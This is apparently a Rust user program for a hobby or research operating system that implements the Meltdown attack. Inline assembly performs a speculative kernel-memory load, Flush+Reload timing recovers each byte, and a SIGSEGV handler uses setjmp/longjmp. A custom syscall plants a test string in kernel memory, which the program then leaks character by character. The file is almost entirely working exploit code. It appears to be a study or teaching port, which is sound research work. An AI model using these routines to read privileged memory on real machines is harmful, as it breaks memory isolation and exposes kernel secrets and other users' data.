#![no_std]

extern crate alloc;

#[allow(unused_imports)]
use runtime::*;
use terminal::{print, println};
use alloc::vec::Vec;
use core::{ptr, mem};
use alloc::alloc::{alloc, dealloc, handle_alloc_error, Layout};
use signal::signal_vector::SignalVector;
use signal::signal_handler::SignalHandler;
use syscall::syscall;
use syscall::SystemCall::{SignalHandlerRegister, ThreadSwitch, MeltdownCopyToKernelMemory};
use concurrent::thread;
use alloc::string::String;
use alloc::boxed::Box;

use core::arch::asm;

use sjlj::{setjmp, longjmp, JumpBuf};
use spin::{Mutex};

static jump_buf: Mutex<JumpBuf> = Mutex::new(JumpBuf::new());
static jump_buf_direct_read: Mutex<JumpBuf> = Mutex::new(JumpBuf::new());

const PAGE_SIZE: usize = 256;

#[derive(Copy, Clone, Debug)] // Required to initialize an entire array with such objects
#[allow(dead_code)]
pub struct MemoryPage([u128; PAGE_SIZE]);

pub struct Config {
	measurements: u32,
	accept_after: u32,
	retries: u32,
}

pub fn meltdown(mem: &[MemoryPage], pointer: *const u8) {
    unsafe {
        asm!(
            "2:", // jump here to restart if shift result was 0
            "mov {tmp3}, [{tmp3}]", // this uses rsi in original, which is 0 and segfaults
            "movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
            "shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
            "jz 2", // restart if shift result was 0
            "mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
            x = in(reg) pointer,
            base = in(reg) &mem[0] as *const MemoryPage,
            tmp = out(reg) _,
            tmp2 = out(reg) _,
            tmp3 = out(reg) _,
        );
    }
}

pub fn meltdown_nonull(mem: &[MemoryPage], pointer: *const u8) {
    unsafe {
        asm!(
            "2:", // jump here to restart if shift result was 0
            "movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
            "shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
            "jz 2", // restart if shift result was 0
            "mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
            x = in(reg) pointer,
            base = in(reg) &mem[0] as *const MemoryPage,
            tmp = out(reg) _,
            tmp2 = out(reg) _,
        );
    }
}

pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u8) {
    unsafe {
        asm!(
            "movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
            "shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
            "mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
            x = in(reg) pointer,
            base = in(reg) &mem[0] as *const MemoryPage,
            tmp = out(reg) _,
            tmp2 = out(reg) _,
        );
    }
}

pub fn rdtsc() -> u64 {
    let high: u32;
    let low: u32;
    unsafe {
        asm!(
            "mfence", // Apparently it was the mfence instructions here which caused all memory accesses to be fast (below threshold), making meltdown attack impossible
            "rdtsc",
            "mfence", // TODO: This is after combining both 32bit parts of the result in the original, i.e. the last line before return
            out("eax") low, // TODO: Can we use rax and rdx instead, to skip combining?
            out("edx") high
        );
    }
    ((high as u64) << 32) | (low as u64)
}

pub fn maccess(pointer: *const MemoryPage) {
    unsafe {
        asm!(
            "mov {tmp}, [{x}]",
            x = in(reg) pointer,
            tmp = out(reg) _,
        );
    }
}

pub fn flush(pointer: *const MemoryPage) {
    unsafe {
        asm!(
            "clflush [{x}]",
            x = in(reg) pointer,
        );
    }
}

pub fn flush_reload(cache_miss_threshold: u64, pointer: *const MemoryPage) -> bool {
    let start_time: u64;
    let end_time: u64;
    
    start_time = rdtsc();
    maccess(pointer);
    end_time = rdtsc();
    
    flush(pointer); // The entry is probably cached now no matter whether it was cached before, flush it so we don't expell the entry we are looking for from the cache by caching all other entries
    
    end_time - start_time < cache_miss_threshold
}

struct SegfaultHandler {
	
}

impl SignalHandler for SegfaultHandler {
	fn trigger(&self) {
		println!("Signal handler triggered!");
	}
}

// Debugging only, to be replaced by a struct with SignalHandler trait
pub fn handle_signal() {
	unsafe {
		if let Some(ref mut buf) = jump_buf_direct_read.try_lock() {
			longjmp(&mut *buf, 1);
		} else {
			longjmp(&mut *jump_buf.lock(), 1);
		}
	}
}

pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> usize {
	//println!("Called libkdump_read_signal_handler for pointer {:?}", pointer);
	for iteration in 0..config.retries {
		let iteration_num_digits = iteration.checked_ilog10().unwrap_or(0) + 1;
		print!(" {}{}", iteration, "\x1b[1D".repeat(iteration_num_digits as usize));
		unsafe {
			if setjmp(&mut *jump_buf.lock()) == 0 {
				meltdown_fast(mem, pointer);
			} else {
				print!(" c\x1b[1D\x1b[1D");
				jump_buf.force_unlock();
			}
		}
		
		for i in 0..mem.len() {
			if flush_reload(cache_miss_threshold, &mem[i] as *const MemoryPage) {
				if i >= 1 { // TODO why ignore first entry?
					//println!("cached value found: {}", i);
					return i;
				} else {
					//println!("cached value found, but ignoring {}", i);
				}
			} else {
				//println!("value {} not cached", i);
			}
			syscall(ThreadSwitch, &[]); // Apparently, switching threads here is important, as otherwise always the second or third entry gets returned, TODO find out why
		}
		syscall(ThreadSwitch, &[]); // Apparently this is important, see above
	}
	return 0; // Maybe this means to only return 0 (first entry) after ensuring it was not one of the other values?
}

pub fn libkdump_read(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> u32 {
	// println!("Called libkdump_read for pointer {:?}", pointer);
	const ARRAY_SIZE: usize = 256;
	let mut res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
	
	syscall(ThreadSwitch, &[]);
	
	for _ in 0..config.measurements {
		// Per default, try loading and measuring the memory three times
		// TODO: Add implementation using TSX?
		// println!("Calling libkdump_read_signal_handler for pointer {:?}", pointer);
		let r = libkdump_read_signal_handler(config, cache_miss_threshold, mem, pointer);
		res_stat[r] += 1;
	}
	
	let mut max_i = 0;
	let mut max_v = res_stat[max_i];
	for (i, v) in res_stat.iter().enumerate() {
		if *v > max_v {
			max_i = i;
			max_v = *v;
		}
	}

	if res_stat[max_i] > config.accept_after {
		max_i as u32
	} else {
		0
	}
}

pub fn detect_flush_reload_threshold(pointer: *const MemoryPage) -> u64{
    let mut reload_time: u64 = 0;
    let mut flush_reload_time: u64 = 0;
    let count: u64 = 10000000;
    let mut start_time: u64;
    let mut end_time: u64;
    
    // TODO Use single value instead of array ok?    
    maccess(pointer);
    for _ in 0..count {
        start_time = rdtsc();
        maccess(pointer);
        end_time = rdtsc();
        reload_time += end_time - start_time;
    }
    
    for _ in 0..count {
        start_time = rdtsc();
        maccess(pointer);
        end_time = rdtsc();
        flush(pointer);
        flush_reload_time += end_time - start_time;
    }
    
    println!("Total time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
    reload_time /= count;
    flush_reload_time /= count;
    println!("Average time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
    let threshold = (flush_reload_time + reload_time * 2) / 3;
    println!("Threshold: {}", threshold);
    return threshold;
}

fn load_thread() {
	let thread = thread::current().expect("Can't get current thread!");
	loop {
		for _ in 0..10000000 {}
		print!("{}", thread.id());
	}
}

fn nop_thread() {
	unsafe {
		loop {
			asm!("nop");
		}
	}
}

#[unsafe(no_mangle)]
pub fn main() {
    println!("Meltdown start\n");
    println!("Address of handle_signal is {:x}", handle_signal as u64);
    syscall(SignalHandlerRegister, &[SignalVector::SIGSEGV as usize, handle_signal as usize]);
    const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K TODO: Original uses 300 non-aligned entries, skips the first 2 for alignment
    let default_config = Config {
		measurements: 3,
		accept_after: 1,
		retries: 10000,
	};
	
	let ptr;
	let layout;
	let mem: Vec<MemoryPage>;
	let page_size = mem::size_of::<MemoryPage>();
	let total_memory = page_size * ARRAY_SIZE;
	
	unsafe {
		layout = Layout::from_size_align(total_memory, 4096).expect("Layout creation failed");
		ptr = alloc(layout);
		if ptr.is_null() {
			handle_alloc_error(layout);
		}
		for i in 0..ARRAY_SIZE {
			ptr::write_bytes(ptr.add(i * page_size), i as u8, page_size);
		}
		mem = Vec::from_raw_parts(ptr as *mut MemoryPage, ARRAY_SIZE, ARRAY_SIZE);
	}
    
    for i in 0..ARRAY_SIZE {
		let cur_ptr = &mem[i] as *const MemoryPage;
		// Construct the correct value: 16 bytes each containing the value of i
		let mut correct_value = i as u128;
		for j in 1..16 {
			correct_value += (i as u128) << j * 8;
		}
		
		assert_eq!((cur_ptr as usize) % 4096, 0); // Check whether all elements are 4K aligned
		for val in mem[i].0.iter() {
			assert_eq!(*val, correct_value); // Check whether all elements are initialised with the value of i
		}
	}
	
	// Cache line granularity is probably 64 bytes, therefore we step by 64 to flush the entire memory. Stepping by 4K is probably also enough, as we only access the first byte of each page, TODO check
	for i in (0..total_memory).step_by(page_size) {
		unsafe {
			flush(ptr.add(i) as *const MemoryPage);
		}
	}
	
	for i in 0..0 {
		// TODO: Find out why load threads are used in the original
		// TODO: Do we really need load threads?
		thread::create(nop_thread);
		println!("Started nop_thread {}!", i);
	}
	
	println!("Current CPU time: {}", rdtsc());
	let cache_miss_threshold = detect_flush_reload_threshold(&mem[0] as *const MemoryPage);
	
	const secret_string: &str = "Whoever reads this is dumb.";
	let SECRET = syscall(MeltdownCopyToKernelMemory, &[secret_string.as_ptr() as usize, secret_string.len() as usize]).expect("Syscall did not return value of secret in kernel space!") as *const u8;
	
	println!("Trying to read secret from address {:?} directly, expecting segmentation fault", SECRET);
	let secret_string_kernel;
	unsafe {
		secret_string_kernel = String::from_raw_parts(SECRET as *mut u8, secret_string.len(), secret_string.len());
	}
	
	println!("Successfully created string object at address {:p}, content at {:p}, trying to read secret...", &secret_string_kernel, secret_string_kernel.as_ptr());
	
	unsafe {
		if setjmp(&mut *jump_buf_direct_read.lock()) == 0 {
			//println!("{}", secret_string_kernel);
			println!("No segmentation fault!");
		} else {
			println!("Got segmentation fault!");
		}
	}
	
	// Prevent using this buffer again, as we're past that now
	// TODO: This could be less hacky
	let lock = jump_buf_direct_read.lock();
	
	print!("Trying to read secret from address {:?} using meltdown...\nExpected: {}\n     Got: ", SECRET, secret_string);
	
	let mut index: usize = 0;
	while index < secret_string.len() {
		let pointer;
		unsafe {
			pointer = SECRET.add(index);
		}
		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, pointer);
		print!("{}", value as u8 as char);
		/*unsafe {
			println!("Got value at address {:?}: {} real: {}", pointer, value, *pointer);
		}*/
		index += 1;
	}
	println!("");
	
	println!("Done. Deallocating now!");
	unsafe {
		dealloc(ptr, layout);
	}
	println!("Done deallocating. Exiting.");
	// TODO: fix `panicked at linked_list_allocator-0.10.5/src/hole.rs:548:9: Hole list out of order?!` after deallocation here
}
